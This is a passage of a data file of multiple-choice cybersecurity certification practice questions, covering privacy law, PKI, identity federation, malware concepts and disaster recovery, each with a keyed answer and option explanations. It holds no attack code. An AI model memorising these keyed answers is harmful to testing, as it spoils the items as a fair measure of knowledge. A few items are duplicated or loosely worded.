  {id:326,domain:P,question:"Which of the following is a primary security control objective of HIPAA Security Rule?",options:["Encryption of all email","Ensure the confidentiality, integrity, and availability of all ePHI","Require MFA for all users","Prohibit cloud storage of health data"],answer:1,explanation:"The HIPAA Security Rule requires covered entities to protect the CIA of all electronic protected health information.",optionExplanations:["HIPAA recommends but does not mandate email encryption as a specific required control.","The HIPAA Security Rule's overall objective is to ensure CIA of all ePHI through administrative, physical, and technical safeguards.","HIPAA does not specifically mandate MFA, though it is a recommended safeguard for access control.","HIPAA does not prohibit cloud storage; it requires any cloud storage to be covered by a Business Associate Agreement (BAA)."]},
  {id:327,domain:O,question:"What is the function of a security information broker?",options:["Buy and sell stolen data","Aggregate and normalize security data from multiple sources for analysis and correlation","Manage vendor security assessments","Provide threat intelligence exclusively"],answer:1,explanation:"A security data broker aggregates logs and events from multiple disparate systems into a common format for analysis.",optionExplanations:["Data brokers in the criminal context sell stolen data; security information brokers are legitimate aggregation tools.","A security information broker normalizes and aggregates security data from diverse sources to enable unified analysis.","Vendor assessments are third-party risk management activities, not a data broker function.","Threat intelligence is one input; a security information broker handles all types of security data."]},
  {id:328,domain:O,question:"What is the purpose of a continuous monitoring program?",options:["Conduct annual security assessments only","Maintain ongoing awareness of information security, vulnerabilities, and threats in real time","Train staff on security policies annually","Deploy security patches quarterly"],answer:1,explanation:"Continuous monitoring provides real-time or near-real-time visibility into security posture, replacing periodic point-in-time assessments.",optionExplanations:["Annual assessments are periodic snapshots; continuous monitoring provides ongoing visibility.","Continuous monitoring maintains persistent awareness of control effectiveness, new vulnerabilities, and threat indicators.","Annual training is part of the security program; continuous monitoring is an operational capability.","Quarterly patching is a patch management cadence; continuous monitoring detects vulnerabilities requiring patching."]},
  {id:329,domain:G,question:"What is the PBKDF2 algorithm used for?",options:["Generating asymmetric key pairs","Deriving cryptographic keys from passwords using salt and iteration count","Encrypting bulk data","Providing TLS session key exchange"],answer:1,explanation:"PBKDF2 (Password-Based Key Derivation Function 2) strengthens passwords by applying HMAC many times with a salt.",optionExplanations:["Asymmetric key pairs are generated by algorithms like RSA or ECDSA; PBKDF2 derives symmetric keys from passwords.","PBKDF2 takes a password, salt, iteration count, and desired key length, producing a strong cryptographic key.","Bulk data encryption uses symmetric ciphers like AES; PBKDF2 derives the key used for such encryption.","TLS session key exchange uses Diffie-Hellman or RSA; PBKDF2 is for password-based key derivation."]},
  {id:330,domain:T,question:"What is the purpose of obfuscation in malware?",options:["Improve malware performance","Make malware code harder to analyze and detect by security tools","Encrypt victim data","Spread malware more efficiently"],answer:1,explanation:"Malware obfuscation (encoding, packing, polymorphism) disguises code to evade signature-based detection and complicate reverse engineering.",optionExplanations:["Obfuscation adds overhead and may reduce performance; detection evasion is the goal.","Malware obfuscation techniques (base64 encoding, packing, string encryption) make analysis and signature detection harder.","Data encryption is what ransomware does to victim files; obfuscation hides the malware's own code.","Propagation uses network/removable media techniques; obfuscation is about evading analysis and detection."]},
  {id:331,domain:A,question:"What is network address translation (NAT) and how does it help security?",options:["It encrypts traffic between internal and external systems","It maps private internal IPs to a public IP, hiding internal network topology from external observers","It prevents all inbound connections by default","It provides authentication for network access"],answer:1,explanation:"NAT hides internal IP addressing from external attackers, reducing reconnaissance information about the internal network.",optionExplanations:["NAT translates addresses but does not encrypt traffic; VPNs and TLS provide encryption.","NAT hides the internal network structure by presenting a single public IP, making it harder for attackers to map internal topology.","NAT can be configured to block unsolicited inbound connections, but this is firewall behavior; NAT's primary purpose is address translation.","Authentication is provided by IAM and 802.1X; NAT is an address translation mechanism."]},
  {id:332,domain:A,question:"What is the purpose of 802.11w (Protected Management Frames)?",options:["Encrypt wireless data frames","Protect 802.11 management frames (deauth, disassoc) from spoofing and injection attacks","Increase wireless network speed","Provide WPA3 compatibility"],answer:1,explanation:"802.11w protects management frames so attackers cannot send fake deauthentication frames to disconnect clients.",optionExplanations:["Data frame encryption is provided by WPA2/WPA3 data encryption (CCMP, GCMP); 802.11w protects management frames.","802.11w (PMF) authenticates management frames preventing deauthentication attacks used to force client disconnections.","Management frame protection adds security overhead; it does not improve network speed.","802.11w is a Wi-Fi security extension; WPA3 mandates PMF, making WPA3 and 802.11w complementary."]},
  {id:333,domain:T,question:"What is a JPEG or PDF file used to deliver malware called?",options:["A rootkit","A malicious document or lure","A bootkit","A macro virus"],answer:1,explanation:"Malicious documents (maldocs) embed exploits or malicious macros in PDFs, Office files, or image metadata to deliver malware.",optionExplanations:["A rootkit is persistent malware hiding at the OS level; a malicious document is a delivery mechanism.","Maldocs are weaponized files (PDF exploits, Office macros) used to deliver malware when opened by victims.","A bootkit infects the MBR or boot process; malicious documents exploit document viewers and macro engines.","Macro viruses are a subset of maldocs; malicious documents include PDF exploits and image file exploits as well."]},
  {id:334,domain:O,question:"What is the purpose of network segmentation in limiting ransomware spread?",options:["Prevent ransomware from encrypting files","Limit how far ransomware can spread by restricting its ability to reach other network segments","Speed up ransomware recovery","Detect ransomware before it executes"],answer:1,explanation:"Segmentation limits ransomware's lateral movement, confining it to the segment where it first landed.",optionExplanations:["File encryption cannot be prevented by network segmentation alone — the infected system will still be encrypted.","Segmentation restricts ransomware from spreading across the entire network by limiting access between segments.","Recovery speed depends on backup quality and DR plans; segmentation limits the damage scope.","Detection is done by EDR and email gateways; segmentation limits spread after detection fails."]},
  {id:335,domain:P,question:"What is the concept of 'right to erasure' (right to be forgotten) under GDPR?",options:["Organizations must immediately delete all data on request","Individuals can request deletion of their personal data under certain conditions, and organizations must comply or provide legal grounds to refuse","It applies only to data held for more than 10 years","Only applies to financial data"],answer:1,explanation:"GDPR Article 17 grants individuals the right to request data deletion when data is no longer necessary or consent is withdrawn.",optionExplanations:["Organizations do not have to delete all data immediately; erasure rights have conditions and exceptions (legal obligations, public interest).","GDPR's right to erasure allows data subjects to request deletion under specific conditions; organizations may refuse with legal justification.","GDPR's retention and erasure principles are not limited to data held beyond a specific time period.","GDPR covers all categories of personal data, not only financial data."]},
  {id:336,domain:G,question:"What is the purpose of certificate transparency (CT) logs?",options:["Revoke compromised certificates","A public audit log of all TLS certificates issued, allowing detection of misissued certificates","Replace OCSP for revocation checking","Store private keys for CA recovery"],answer:1,explanation:"CT logs create an auditable, append-only record of all certificates issued by CAs, enabling domain owners to detect unauthorized certs.",optionExplanations:["Certificate revocation is done through CRLs and OCSP; CT logs are for auditing and detection.","CT logs provide public visibility into all certificates issued, so domain owners can spot unexpected or fraudulent certificates.","OCSP handles revocation; CT logs handle issuance auditing.","Private keys must never appear in public logs; CT logs contain only the public certificate data."]},
  {id:337,domain:G,question:"What is a certificate signing request (CSR)?",options:["A request to revoke a certificate","A message sent to a CA containing the public key and identity information, requesting a signed certificate","A digital signature on a certificate","A request to renew an expiring certificate"],answer:1,explanation:"A CSR contains the entity's public key and identity (CN, SAN, organization) and is signed with the corresponding private key.",optionExplanations:["Certificate revocation is requested through the CA's revocation processes; a CSR is for obtaining a new certificate.","A CSR is submitted to the CA with the applicant's public key and information; the CA signs and returns a certificate.","A digital signature on a certificate is the CA's signature; a CSR requests that signature.","Renewal typically involves submitting a new CSR; the process itself is not called a CSR."]},
  {id:338,domain:T,question:"What is a pass-the-certificate attack?",options:["Using a stolen password to log in","Using a stolen digital certificate and key pair to authenticate without knowing the password","A phishing attack using certificate warnings","Forging a root CA certificate"],answer:1,explanation:"Pass-the-certificate reuses stolen certificates and private keys (from certificate stores) to authenticate to services that accept certificate authentication.",optionExplanations:["Using a stolen password is credential theft; pass-the-certificate uses cryptographic material.","Pass-the-certificate extracts certificate/key pairs from certificate stores and uses them to authenticate as the victim.","Certificate warning phishing tricks users into ignoring TLS errors; it is not pass-the-certificate.","Forging CA certificates requires the CA's private key; pass-the-certificate uses legitimate stolen certificates."]},
  {id:339,domain:O,question:"What is the purpose of a deception technology solution?",options:["Prevent all attacks before they happen","Create fake assets and data throughout the environment to detect and slow down attackers who enter the network","Replace traditional detection controls","Train staff in attacker techniques"],answer:1,explanation:"Deception technology (honeypots, honeyfiles, fake credentials) alerts defenders when attackers interact with decoy assets.",optionExplanations:["Deception detects attackers inside the network; it cannot prevent attacks from entering.","Deception technologies create attractive fake targets that alert defenders the moment an attacker interacts with them.","Deception supplements detection; it does not replace firewalls, IDS/IPS, or SIEM.","Red team training teaches attacker techniques; deception technology is a defensive detection mechanism."]},
  {id:340,domain:P,question:"What is the purpose of a security awareness training program metric?",options:["Determine how many security tools are deployed","Measure the effectiveness of training in reducing security risk behaviors among employees","Track attendance for compliance purposes only","Evaluate the technical skills of security staff"],answer:1,explanation:"Meaningful metrics (phishing click rates, reporting rates, policy quiz scores) measure behavioral change, not just compliance.",optionExplanations:["Tool count is a technical inventory metric; training metrics measure human behavior change.","Training metrics quantify whether employees recognize and avoid threats — e.g., reduction in phishing click-through rates.","Attendance tracking satisfies compliance checklists but does not measure whether training changed behavior.","Technical staff skills are measured through separate certification and competency assessments."]},
  {id:341,domain:G,question:"What is the purpose of a security assertion markup language (SAML) assertion?",options:["Encrypt user passwords","An XML document passed from an identity provider to a service provider confirming user authentication","Generate digital signatures for emails","Manage certificate revocation"],answer:1,explanation:"A SAML assertion is an XML statement from the IdP to the SP declaring the user's identity and attributes after authentication.",optionExplanations:["Password encryption is handled by hashing algorithms; SAML assertions are authentication confirmation messages.","SAML assertions carry the IdP's signed confirmation that a user has authenticated, enabling SSO across services.","Email digital signatures use S/MIME or PGP; SAML assertions are web SSO messages.","Certificate revocation uses CRLs and OCSP; SAML is a federation and SSO protocol."]},
  {id:342,domain:G,question:"What is OpenID Connect (OIDC)?",options:["An encryption protocol for API communications","An identity layer built on top of OAuth 2.0 providing authentication and identity information","A key management protocol","A digital certificate standard"],answer:1,explanation:"OIDC adds an identity layer to OAuth 2.0, providing ID tokens (JWT) with user identity claims for authentication.",optionExplanations:["API encryption is handled by TLS; OIDC is an authentication and identity protocol.","OpenID Connect extends OAuth 2.0 with authentication capabilities, issuing ID tokens containing user identity information.","Key management is handled by KMS solutions; OIDC manages identity tokens.","Digital certificates follow X.509 standards; OIDC uses JWT tokens for identity."]},
  {id:343,domain:T,question:"What is a fileless attack that uses PowerShell for malicious purposes called?",options:["A macro virus","A PowerShell-based living-off-the-land attack","A rootkit","A wiper attack"],answer:1,explanation:"Attackers use legitimate PowerShell to download payloads, manipulate systems, and evade detection without dropping files.",optionExplanations:["Macro viruses are embedded in Office documents; PowerShell attacks run in memory.","Using PowerShell for malicious purposes is a prime example of living-off-the-land — no external malware files needed.","Rootkits hide at the kernel level; PowerShell attacks operate at the user/OS level.","Wipers destroy data; PowerShell attacks may destroy, steal, or persist depending on objectives."]},
  {id:344,domain:T,question:"What is the primary security risk of IoT devices?",options:["IoT devices are too expensive","IoT devices often lack security updates, use default credentials, and have minimal security features","IoT devices consume too much bandwidth","IoT devices are difficult to configure"],answer:1,explanation:"IoT devices frequently run outdated firmware, use default credentials, and cannot be patched, creating persistent network vulnerabilities.",optionExplanations:["Cost is a procurement consideration, not a security risk.","IoT devices often run stripped-down OSes without update mechanisms, factory-default passwords, and no security tooling.","Bandwidth consumption is a performance concern; security weaknesses are the primary risk.","Configuration difficulty is a usability issue; the security risk is the lack of security controls."]},
  {id:345,domain:A,question:"What is a VPC (Virtual Private Cloud)?",options:["A virtual private network for users","An isolated, logically defined section of a public cloud provider's infrastructure dedicated to one customer","A type of cloud-based VPN","A private data center hosted at a cloud provider"],answer:1,explanation:"A VPC provides network isolation within a public cloud, allowing customers to define their own IP ranges, subnets, and routing.",optionExplanations:["A VPN creates encrypted tunnels; a VPC is a network isolation construct within a cloud provider.","A VPC is a logically isolated section of a cloud provider's network that a customer fully controls (subnets, routing, security groups).","While a VPC can host VPN endpoints, it is not itself a VPN.","A private data center is on-premises; a VPC is cloud infrastructure logically isolated for a single customer."]},
  {id:346,domain:A,question:"What is the purpose of a cloud security posture management (CSPM) tool?",options:["Encrypt cloud data","Continuously monitor cloud environments for misconfigurations and compliance violations","Provide VPN access to cloud resources","Replace cloud native security controls"],answer:1,explanation:"CSPM tools automatically detect and remediate cloud misconfigurations (public S3 buckets, open security groups) that expose organizations.",optionExplanations:["Data encryption is a cloud security control; CSPM monitors the configuration of those controls.","CSPM identifies cloud infrastructure misconfigurations, policy violations, and compliance deviations automatically.","VPN access is provided by cloud VPN gateways; CSPM monitors security configurations.","CSPM adds visibility and governance on top of native controls; it does not replace them."]},
  {id:347,domain:O,question:"What is the OODA loop and how does it apply to security?",options:["A malware analysis framework","A decision cycle (Observe, Orient, Decide, Act) used by security teams to outpace attackers","An incident classification system","A network monitoring protocol"],answer:1,explanation:"The OODA loop enables faster decision-making cycles than attackers — observing what's happening, orienting to context, deciding, and acting.",optionExplanations:["Malware analysis uses sandbox analysis and reverse engineering; OODA is a decision-making framework.","The OODA (Observe, Orient, Decide, Act) loop helps security teams make rapid, informed decisions to stay ahead of attackers.","Incident classification uses severity levels and categories; OODA is a response decision model.","Network monitoring collects data; OODA is the framework for acting on that data."]},
  {id:348,domain:O,question:"What does IoC (Indicator of Compromise) differ from an IoA (Indicator of Attack)?",options:["They are the same thing","IoCs are evidence of past compromise; IoAs are behavioral patterns indicating an ongoing attack","IoAs are always more accurate than IoCs","IoCs are used for prevention; IoAs are used for detection"],answer:1,explanation:"IoCs (file hashes, IPs) are forensic artifacts after compromise; IoAs (lateral movement patterns) indicate an attack in progress.",optionExplanations:["IoCs and IoAs serve different purposes in the attack timeline.","IoCs are post-compromise artifacts (file hashes, registry keys); IoAs are real-time behavioral indicators of active attack progression.","Both have value; IoAs often provide earlier warning while IoCs confirm compromise.","IoCs support detection and forensics; IoAs enable earlier detection and prevention during an active attack."]},
  {id:349,domain:P,question:"What is the concept of 'privacy engineering'?",options:["Building surveillance systems","Systematically integrating privacy requirements into technical systems throughout the engineering lifecycle","Auditing privacy policies annually","Training developers on GDPR compliance"],answer:1,explanation:"Privacy engineering applies technical methods to identify and mitigate privacy risks throughout system design and development.",optionExplanations:["Surveillance system development is the opposite of privacy engineering.","Privacy engineering integrates privacy impact analysis, data flow mapping, and privacy-preserving design into the development process.","Auditing is a compliance activity; privacy engineering is a proactive design methodology.","GDPR training is awareness; privacy engineering is the technical discipline of building privacy in."]},
  {id:350,domain:G,question:"What is a hybrid encryption scheme?",options:["Using two different symmetric algorithms together","Using asymmetric encryption to protect a symmetric key, then symmetric encryption for bulk data","Encrypting data twice with different keys","Using one key for authentication and another for encryption"],answer:1,explanation:"Hybrid encryption (used in TLS, PGP) uses asymmetric to securely exchange a symmetric key, then symmetric for fast bulk data encryption.",optionExplanations:["Two symmetric algorithms together is double encryption, not hybrid encryption.","Hybrid encryption combines the key management advantages of asymmetric with the speed advantages of symmetric encryption.","Double encryption uses the same type of algorithm twice; hybrid combines asymmetric and symmetric.","Using separate keys for authentication and encryption is dual-use key management; hybrid encryption is about combining algorithm types."]},
  {id:351,domain:T,question:"What is a watering hole attack?",options:["Flooding a server with traffic","Compromising websites frequently visited by a target group to infect their systems","Intercepting communications between two parties","Sending phishing emails to specific individuals"],answer:1,explanation:"Watering hole attacks compromise websites that the target group frequently visits, allowing attackers to infect visitors without direct contact.",optionExplanations:["Flooding a server with traffic is a denial-of-service attack, not a watering hole attack.","Watering hole attacks identify websites targets visit, compromise those sites, and infect visitors through drive-by downloads or exploits.","Intercepting communications is a man-in-the-middle attack; watering hole attacks use compromised websites.","Phishing targets individuals directly; watering hole attacks passively wait for targets to visit compromised sites."]},
  {id:352,domain:G,question:"What is key escrow in cryptography?",options:["Storing keys in a hardware security module","A system where a copy of an encryption key is held by a trusted third party for authorized recovery","Distributing keys across multiple servers","Generating keys from a shared secret"],answer:1,explanation:"Key escrow allows authorized parties (law enforcement, recovery agents) to access encrypted data by retrieving the stored key copy.",optionExplanations:["HSM storage is a key protection mechanism; key escrow is a deliberate backup for recovery or lawful access.","Key escrow intentionally provides a copy to a trusted party, enabling authorized decryption when the original key holder cannot provide access.","Distributing keys across servers is key splitting or threshold cryptography; escrow places a full copy with a trusted party.","Generating keys from shared secrets is Diffie-Hellman; escrow is about storing copies of existing keys."]},
  {id:353,domain:A,question:"What is a jump server (jump box) used for in network security?",options:["Testing network performance","A hardened intermediate host used to access systems in isolated or high-security network segments","Routing traffic between VLANs","Running vulnerability scans on network devices"],answer:1,explanation:"Jump servers provide a controlled access point to sensitive network zones, logging all activity and reducing direct exposure of internal systems.",optionExplanations:["Network performance testing uses dedicated tools like iPerf; a jump box controls administrative access.","A jump server (or bastion host) sits between the administrator and target systems, logging and controlling privileged access to sensitive zones.","VLAN routing is performed by Layer 3 switches or routers; jump boxes control administrative access paths.","Vulnerability scanning tools (Nessus, Qualys) perform scans; jump boxes are access control points."]},
  {id:354,domain:O,question:"What is the primary purpose of security information and event management (SIEM) correlation rules?",options:["Encrypting log data","Identifying patterns across multiple log sources that indicate potential security incidents","Compressing log files for storage","Automatically patching vulnerabilities"],answer:1,explanation:"SIEM correlation rules analyze events from multiple sources to detect attack patterns like brute force, lateral movement, or data exfiltration.",optionExplanations:["Log encryption protects confidentiality; SIEM correlation analyzes log content to detect threats.","Correlation rules match events across sources — failed logins followed by success, then large data transfers — to surface attack sequences.","Log compression reduces storage costs; SIEM correlation extracts meaning from log data.","Patch management addresses vulnerabilities; SIEM detects exploitation of vulnerabilities and other security events."]},
  {id:355,domain:T,question:"What distinguishes a zero-day exploit from a known vulnerability exploit?",options:["Zero-days are less dangerous than known exploits","A zero-day targets a vulnerability unknown to the vendor, while known exploits target published vulnerabilities","Zero-days only affect operating systems","Known exploits are more reliable than zero-days"],answer:1,explanation:"Zero-day exploits target vulnerabilities the vendor doesn't know about, so no patch exists, making them extremely valuable and dangerous.",optionExplanations:["Zero-days are typically more dangerous because no patch exists and detection is harder.","A zero-day exploit targets a previously unknown vulnerability, giving defenders zero days to patch before exploitation occurs.","Zero-days affect any software layer — browsers, applications, firmware, operating systems.","Known exploits may be reliable due to public PoC code, but zero-days have the advantage of no defenses being in place."]},
  {id:356,domain:P,question:"What is the purpose of a data retention policy?",options:["To keep all data forever","To define how long different data types should be kept and when they must be securely deleted","To replicate data to multiple locations","To classify data by sensitivity level"],answer:1,explanation:"Data retention policies balance legal/regulatory requirements (keeping records) with privacy obligations (deleting personal data when no longer needed).",optionExplanations:["Keeping all data forever creates excessive storage costs and privacy liabilities; retention policies set defined timelines.","Retention policies specify periods for different data types (7 years for financial, 3 years for HR) and mandate secure deletion after those periods.","Data replication is a business continuity control; retention policies govern the lifecycle of data.","Data classification determines sensitivity levels; retention policies determine how long to keep data of each classification."]},
  {id:357,domain:A,question:"What is network segmentation and why is it a security control?",options:["Increasing network bandwidth","Dividing a network into isolated zones to limit lateral movement and contain breaches","Encrypting all network traffic","Filtering email attachments at the gateway"],answer:1,explanation:"Network segmentation contains breaches by limiting how far attackers can move — a compromised guest network can't reach production systems.",optionExplanations:["Network bandwidth is a performance concern; segmentation is a security architecture control.","Segmentation creates isolated zones (DMZ, production, HR, guest) with firewall rules between them, limiting blast radius if one zone is compromised.","Traffic encryption (TLS/IPsec) protects data in transit; segmentation controls which systems can communicate with each other.","Email gateway filtering protects against malicious content; segmentation controls network-level communications."]},
  {id:358,domain:O,question:"What is the goal of a tabletop exercise in incident response?",options:["Testing technical response tools","A discussion-based simulation where team members work through a scenario to identify gaps in plans and procedures","Measuring network latency under attack conditions","Validating backup restoration procedures"],answer:1,explanation:"Tabletop exercises identify communication gaps, unclear responsibilities, and missing procedures without executing actual response actions.",optionExplanations:["Technical tool testing occurs in functional exercises and drills; tabletop is discussion-based.","Tabletop exercises walk through a hypothetical scenario verbally, revealing gaps in roles, escalation paths, decision-making, and communication.","Network performance testing is separate from incident response planning; tabletops focus on process and decision gaps.","Backup validation is a technical recovery test; tabletop exercises focus on people and process, not technical systems."]},
  {id:359,domain:G,question:"What is the difference between symmetric and asymmetric encryption in terms of key management?",options:["Symmetric uses two keys; asymmetric uses one","Symmetric uses a single shared secret key; asymmetric uses a public/private key pair","They use the same key management approach","Asymmetric requires hardware security modules"],answer:1,explanation:"Symmetric key distribution is the challenge (how to share the secret securely); asymmetric solves this with freely shareable public keys.",optionExplanations:["Symmetric uses one shared key; asymmetric uses mathematically linked key pairs.","Symmetric encryption uses one key for both encryption and decryption, requiring secure key exchange; asymmetric uses key pairs where the public key can be freely shared.","Asymmetric and symmetric have fundamentally different key management approaches — the public/private pair eliminates the key distribution problem.","While HSMs can store asymmetric keys, they are not required; asymmetric keys can be stored in software keystores."]},
  {id:360,domain:T,question:"What is credential stuffing?",options:["Creating fake credentials for testing","Using stolen username/password pairs from one breach to attempt login on other services","Brute-forcing password hashes","Embedding credentials in malware"],answer:1,explanation:"Credential stuffing exploits password reuse — attackers take breach dumps and try those credentials against banks, email, and other high-value sites.",optionExplanations:["Creating test credentials is a development practice; credential stuffing uses stolen real credentials.","Credential stuffing uses credential databases from previous breaches to automate login attempts across many services, exploiting password reuse.","Brute forcing hashes is offline cracking; credential stuffing attempts live logins with complete username/password pairs.","Embedding credentials in malware is hardcoded credentials; credential stuffing is an automated attack using breach data."]},
  {id:361,domain:A,question:"What is a software-defined perimeter (SDP)?",options:["A virtual firewall","A security framework that dynamically creates one-to-one network connections between users and resources they are authorized to access","A DMZ implemented in software","A cloud-based IDS system"],answer:1,explanation:"SDP hides network resources until after authentication and authorization, making infrastructure invisible to unauthorized users (implements zero trust).",optionExplanations:["Virtual firewalls inspect traffic; SDP makes resources invisible until authenticated — a fundamentally different approach.","SDP (also called black cloud) authenticates users first, then dynamically provisions encrypted connections only to authorized resources, never exposing the network.","A software DMZ is still a traditional network zone; SDP eliminates the perimeter concept entirely.","Cloud IDS monitors for threats; SDP controls access by making resources invisible to unauthenticated users."]},
  {id:362,domain:O,question:"What is the purpose of a business impact analysis (BIA)?",options:["Analyzing competitor business strategies","Identifying critical business functions and quantifying the impact of their disruption on the organization","Reviewing IT system performance metrics","Assessing employee productivity levels"],answer:1,explanation:"The BIA identifies critical functions, recovery time objectives (RTO), recovery point objectives (RPO), and financial impact of downtime.",optionExplanations:["Competitor analysis is a business intelligence activity; BIA focuses on internal operations and their recovery requirements.","A BIA identifies which processes are most critical, the maximum tolerable downtime, data loss tolerance, and financial/reputational impact of disruptions.","IT performance metrics are operational monitoring; BIA establishes business recovery requirements that drive IT continuity planning.","Employee productivity is an HR concern; BIA focuses on process criticality and disruption impact quantification."]},
  {id:363,domain:T,question:"What is a living off the land (LotL) attack technique?",options:["Planting physical devices in target facilities","Using legitimate built-in system tools (PowerShell, WMI, certutil) to conduct malicious activities without deploying custom malware","Attacking IoT devices in agricultural settings","Using social engineering to gain physical access"],answer:1,explanation:"LotL attacks abuse trusted tools already present on systems, making detection difficult since the tools are legitimate and expected to run.",optionExplanations:["Physical device planting is a hardware-based attack; LotL uses existing software tools.","LotL attackers use PowerShell, WMI, certutil, and other built-in Windows/Linux tools to evade detection because these tools are expected to be running.","LotL is a technique applicable to any environment; it's not specific to agricultural or IoT contexts.","Physical access via social engineering is a different attack vector; LotL refers specifically to using native system tools for malicious purposes."]},
  {id:364,domain:G,question:"What is the role of a certificate revocation list (CRL)?",options:["A list of trusted root certificates","A published list of certificates that have been revoked before their expiration date","A list of certificates pending renewal","A registry of all issued certificates"],answer:1,explanation:"CRLs allow relying parties to check if a certificate has been revoked due to key compromise, CA compromise, or policy violation.",optionExplanations:["Trusted root certificates are stored in a trust store; CRLs list revoked certificates.","A CRL lists certificate serial numbers that have been invalidated, allowing clients to verify a certificate hasn't been revoked before trusting it.","Renewal lists are managed internally by CAs; CRLs publish revocation status to the public.","Certificate registries track issuance; CRLs specifically list certificates that are no longer trustworthy despite not yet being expired."]},
  {id:365,domain:P,question:"What is a privacy impact assessment (PIA)?",options:["An assessment of data center physical security","A systematic process for evaluating the privacy risks of collecting or processing personal information","An audit of employee privacy training completion","A review of network security controls"],answer:1,explanation:"PIAs identify how personal data will be collected, used, stored, and shared, and assess risks to individuals' privacy rights.",optionExplanations:["Physical security assessments evaluate facility controls; PIAs analyze data privacy risks.","A PIA examines the data lifecycle — what's collected, why, how long kept, who can access it — and identifies risks and mitigations for privacy rights.","Training audits are compliance checks; PIAs are risk assessments of specific data processing activities.","Network security reviews are technical assessments; PIAs focus on the legal and ethical dimensions of personal data handling."]},
  {id:366,domain:A,question:"What is microsegmentation in cloud and virtualized environments?",options:["Dividing a physical server into multiple VMs","Applying fine-grained security policies at the individual workload level, controlling east-west traffic between workloads","Segmenting network traffic by size","Creating separate cloud regions for each application"],answer:1,explanation:"Microsegmentation applies policies between individual VMs or containers, preventing lateral movement even within the same network segment.",optionExplanations:["Creating VMs from a physical server is virtualization; microsegmentation is a security policy applied to those VMs.","Microsegmentation enforces security policies at the workload level, controlling traffic between individual services and preventing attackers from moving laterally between systems.","Traffic segmentation by packet size is a QoS concept; microsegmentation is about security policy enforcement between workloads.","Multiple cloud regions provide redundancy; microsegmentation provides granular security policy within environments."]},
  {id:367,domain:O,question:"What is threat hunting?",options:["Running automated vulnerability scans","Proactively searching through networks and systems for signs of compromise that evaded automated detection","Setting up honeypots to attract attackers","Responding to alerts generated by security tools"],answer:1,explanation:"Threat hunters assume compromise has occurred and use hypotheses, data analysis, and security expertise to find hidden attackers.",optionExplanations:["Vulnerability scanning finds weaknesses; threat hunting looks for active adversaries that have already penetrated defenses.","Threat hunting is a proactive, analyst-driven search for adversaries using TTPs, hypotheses, and anomaly analysis to find what automated tools missed.","Honeypots are deception technology; threat hunting actively searches production systems for signs of compromise.","Responding to alerts is reactive security operations; threat hunting is proactive and assumes automated detection has already failed."]},
  {id:368,domain:T,question:"What is a command and control (C2) server in the context of malware?",options:["A server that manages user authentication","Infrastructure controlled by attackers that sends commands to and receives data from compromised machines","A legitimate server for software updates","A server that detects and removes malware"],answer:1,explanation:"C2 infrastructure allows attackers to control botnets and malware remotely, issuing instructions and exfiltrating data from compromised hosts.",optionExplanations:["Authentication servers manage identity; C2 servers control compromised endpoints.","C2 (or C&C) servers are attacker-controlled infrastructure that maintains communication with malware on victim systems, enabling remote control and data exfiltration.","Software update servers are legitimate infrastructure; C2 servers are malicious infrastructure mimicking legitimate communications.","Security tools detect and remove malware; C2 servers enable attackers to operate and direct that malware."]},
  {id:369,domain:G,question:"What is forward secrecy (perfect forward secrecy)?",options:["Encrypting future communications in advance","A property ensuring that session keys are not compromised even if the server's private key is later compromised","Forwarding encrypted packets to multiple destinations","Generating backup keys before certificate expiration"],answer:1,explanation:"PFS uses ephemeral key exchange (ECDHE/DHE) so each session has a unique key — past traffic stays secure even if the private key is stolen later.",optionExplanations:["Encrypting future communications in advance is not a real security concept; PFS protects past sessions from future key compromise.","Perfect forward secrecy generates ephemeral session keys that are discarded after use, so compromising the long-term private key cannot decrypt recorded past sessions.","Forwarding encrypted packets is a routing concept; PFS is a key exchange property ensuring past session keys remain secure.","Backup key generation is key management; PFS is a property of ephemeral key exchange protocols."]},
  {id:370,domain:O,question:"What is the difference between RTO and RPO in disaster recovery?",options:["They are identical metrics","RTO is the maximum acceptable downtime before recovery; RPO is the maximum acceptable data loss measured in time","RTO applies to databases; RPO applies to applications","RPO measures recovery speed; RTO measures data backup frequency"],answer:1,explanation:"RTO (Recovery Time Objective) defines how quickly systems must be restored; RPO (Recovery Point Objective) defines how much data loss is acceptable.",optionExplanations:["RTO and RPO are distinct metrics addressing different aspects of recovery requirements.","RTO asks 'how long can we be down?' (e.g., 4 hours); RPO asks 'how much data can we lose?' (e.g., last 1 hour of transactions).","Both metrics apply to any critical system or application, not specific technology categories.","RPO determines backup frequency needed to meet data loss tolerance; RTO determines infrastructure needed to meet recovery time goals."]},
  {id:371,domain:T,question:"What is a rootkit?",options:["A collection of administrator scripts","Malware that gains and hides deep OS-level access, concealing its presence and other malware from the system","A legitimate remote access tool","A tool for managing system root accounts"],answer:1,explanation:"Rootkits modify the OS kernel or bootloader to hide processes, files, and network connections, making detection and removal extremely difficult.",optionExplanations:["Administrator scripts are legitimate management tools; rootkits are malicious and designed for concealment.","Rootkits subvert OS functions to hide malicious activity — they intercept system calls to filter out their own processes, files, and registry keys from security tools.","Remote access tools (RATs) provide remote control; rootkits specifically provide stealth by hiding the attacker's presence.","Root account management tools control privileges; rootkits exploit root/kernel access to persist and hide."]},
  {id:372,domain:A,question:"What is a web application firewall (WAF) designed to protect against?",options:["Network-level DDoS attacks","Application-layer attacks targeting web applications, such as SQL injection, XSS, and CSRF","Malware on endpoint devices","Unauthorized physical access to web servers"],answer:1,explanation:"WAFs inspect HTTP/HTTPS traffic and block attacks targeting application logic — things traditional network firewalls cannot detect.",optionExplanations:["Network DDoS is mitigated by anti-DDoS services and network firewalls; WAFs protect web application logic.","WAFs analyze HTTP requests and responses, detecting and blocking application-layer attacks like SQL injection, XSS, path traversal, and bot attacks.","Endpoint malware is addressed by EDR/antivirus; WAFs protect web application layers from remote attack.","Physical access controls are separate; WAFs protect against remote application-layer attacks through web protocols."]},
  {id:373,domain:P,question:"What is the right to erasure (right to be forgotten) under GDPR?",options:["The right to delete others' data","An individual's right to request deletion of their personal data when it is no longer necessary or consent is withdrawn","The right to prevent automated decision-making","A right to access all data held about an individual"],answer:1,explanation:"Article 17 GDPR allows individuals to request deletion of their personal data under specific circumstances, including withdrawal of consent.",optionExplanations:["The right to erasure applies to one's own personal data; you cannot request deletion of data about others.","GDPR Article 17 gives individuals the right to request organizations delete their personal data when processing is no longer justified, consent is withdrawn, or data was processed unlawfully.","The right to object to automated decision-making is GDPR Article 22; erasure is Article 17.","The right of access (Article 15) allows seeing held data; erasure (Article 17) allows requesting its deletion."]},
